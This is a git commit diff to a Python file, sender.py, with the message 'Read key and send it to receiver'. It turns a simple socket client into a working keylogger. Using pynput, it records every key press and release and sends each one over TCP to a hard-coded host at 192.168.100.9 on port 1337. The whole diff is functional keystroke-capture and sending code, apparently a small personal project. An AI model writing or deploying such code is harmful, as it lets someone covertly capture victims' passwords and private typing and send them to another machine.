cac2f77ebd51bcb1368b5e93f0ffeec38dd51aab
Cosmin A <anghelcosminandrei@gmail.com>
2018-12-16 17:51:30 +0200

    #3 Read key and send it to receiver

--- sender.py
+++ sender.py
@@ -1,14 +1,23 @@
 #!/usr/bin/env python3
 
 import socket
+from pynput.keyboard import Key, Listener
 
 HOST = '192.168.100.9'
 PORT = 1337
 
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 socket.connect((HOST, PORT))
-socket.sendall(b'Hello cat!')
 
-data = socket.recv(1024)
 
-print('Received: ' + repr(data))
+def on_press(key):
+    socket.sendall(bytes('press: ' + str(key), encoding='utf-8'))
+
+
+def on_release(key):
+    socket.sendall(bytes('release: ' + str(key), encoding='utf-8'))
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
